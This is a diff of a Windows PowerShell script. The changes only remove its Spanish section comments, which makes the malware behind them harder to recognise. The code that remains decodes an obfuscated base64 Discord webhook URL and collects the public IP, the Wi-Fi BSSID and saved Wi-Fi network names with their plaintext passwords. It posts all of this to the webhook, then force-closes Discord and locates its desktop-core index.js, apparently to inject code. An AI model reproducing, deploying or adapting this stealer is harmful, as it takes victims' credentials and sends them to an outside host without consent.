@@ -1,13 +1,11 @@
-# 1. Kill-Switch: Solo ejecutar en Windows
+
 if ($IsMacOS -or $IsLinux -or $env:OSTYPE -like "*darwin*" -or $env:OSTYPE -like "*linux*") {
     exit
 }
 
-# 2. Configuración de la Webhook
 $b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MTkxNTcwMzYyMjgzMjIyOC9Ea1lackRwM1JJcVIwVVh1SkhBSURadklrX19nVk0zU29WMmU3QWZsZ0xETXRCRTV3T2ZoYmJvYnlQcHBPLU9UNjdjaQ=="
 $w = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
 
-# 3. Recolección de Información (Windows Only)
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $ip = try{(IWR api.ipify.org -TimeoutSec 5).Content}catch{'Unknown'}
 $b = try{((netsh wlan show int|sls BSSID).ToString().Split(':')[1..6]-join':').Trim()}catch{'N/A'}
@@ -28,11 +26,9 @@ foreach($n in $pr){
     if($v){$p = $v.ToString().Split(':')[1].Trim(); $out += "SSID: $n | Pass: $p`n"}
 }
 
-# 4. Envío del reporte inicial
 $j = @{content='```' + $out + '```'} | ConvertTo-Json
 try { Invoke-RestMethod -Uri $w -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($j)) -ContentType 'application/json' } catch {}
 
-# 5. Inyección en Discord
 Stop-Process -Name Discord -Force -ErrorAction SilentlyContinue
 $f = (Get-ChildItem -Path "$env:LOCALAPPDATA\Discord\app-*" -Filter "index.js" -Recurse | Where-Object {$_.FullName -like "*discord_desktop_core*"} | Select-Object -ExpandProperty FullName -First 1)
 
